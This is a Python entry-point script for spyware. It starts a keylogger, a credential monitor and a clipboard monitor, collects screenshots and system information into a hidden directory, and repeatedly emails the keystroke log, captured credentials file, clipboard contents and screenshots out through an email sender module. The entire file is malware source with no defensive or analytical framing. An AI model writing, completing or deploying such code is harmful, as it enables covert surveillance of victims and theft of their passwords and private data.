import threading
import time
import os
import sys
from keylogger_core import Keylogger
from system_info import save_sysinfo
from media_capture import take_screenshot   # no webcam import
from credential_monitor import CredentialMonitor
from clipboard_monitor import ClipboardMonitor
from email_sender import EmailSender
from config import SEND_INTERVAL, HIDDEN_DIR, LOG_FILE, SCREENSHOT_FILE, SYSINFO_FILE

def main():
    os.makedirs(HIDDEN_DIR, exist_ok=True)

    keylogger = CredentialMonitor()
    clipboard = ClipboardMonitor()
    sender = EmailSender()

    kl_thread = threading.Thread(target=keylogger.start, daemon=True)
    kl_thread.start()
    clipboard.start()

    while True:
        try:
            sysinfo_path = save_sysinfo()
            screenshot_path = take_screenshot()   # only screenshot

            # Attachments without webcam
            attachments = [
                os.path.join(HIDDEN_DIR, LOG_FILE),
                os.path.join(HIDDEN_DIR, "Cred.txt"),
                os.path.join(HIDDEN_DIR, ".clipboard.txt"),
                screenshot_path,
                sysinfo_path
            ]
            sender.send_with_retry(attachments)
            time.sleep(SEND_INTERVAL)
        except KeyboardInterrupt:
            print("Stopping...")
            keylogger.stop()
            clipboard.stop()
            sys.exit(0)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    main()